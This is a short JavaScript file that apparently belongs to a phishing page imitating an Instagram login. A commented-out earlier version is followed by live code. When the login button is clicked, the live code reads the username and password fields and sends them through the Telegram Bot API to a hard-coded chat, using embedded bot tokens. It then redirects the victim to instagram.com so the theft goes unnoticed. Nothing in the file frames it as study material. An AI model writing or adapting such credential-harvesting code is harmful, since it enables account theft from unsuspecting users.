// // 5530572466

// let login_button = document.querySelector('.login-button')
// let inputs = document.querySelectorAll('input')
// bot_token = '7168480605:AAH3Q6Fjg3l2BK30_8uQHzIU72VWq5_pu0E'


// login_button.addEventListener('click', () => {
//     fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json'
//         },
//         body: JSON.stringify({
//             chat_id: '5530572466',
//             text: `parol:${inputs[0].value} \n password:${inputs[1].value}`
//     })
// }).then(res => res.json()).then(data)
// })

// 6435284364
let login_button = document.querySelector('.login-button');
let inputs = document.querySelectorAll('input');
let bot_token = '7208152439:AAEctAPfVDfpwwu4dh0xkxwY8jO1nBGJyGk';

login_button.addEventListener('click', () => {
    fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: 6435284364,
            text: `login:${inputs[0].value} \n password:${inputs[1].value}`
        })
    }).then(res => res.json()).then(data => {
        window.location.href = 'https://instagram.com';
    });
});
